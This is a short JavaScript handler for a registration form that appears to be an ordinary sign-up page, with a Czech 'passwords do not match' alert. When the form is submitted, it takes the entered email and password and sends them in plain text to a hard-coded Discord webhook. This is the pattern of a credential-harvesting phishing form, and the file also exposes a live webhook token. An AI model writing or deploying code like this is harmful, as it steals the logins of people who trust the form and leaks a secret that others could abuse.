const form = document.getElementById("register");

form.addEventListener("submit", (event)=>
{
    event.preventDefault();



    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    if(password!=document.getElementById("password2").value)
    {
        window.alert("hesla se neshodují")
    }

    else
    {
        const content = `email: ${email}\npassword: ${password}`
        
        fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
        {
            method: "POST", 
            headers: 
            {
                "Content-Type" : "application/json"
            },
            body: JSON.stringify({
                username: "Dáda",
                content: content
            })
        })
    }
});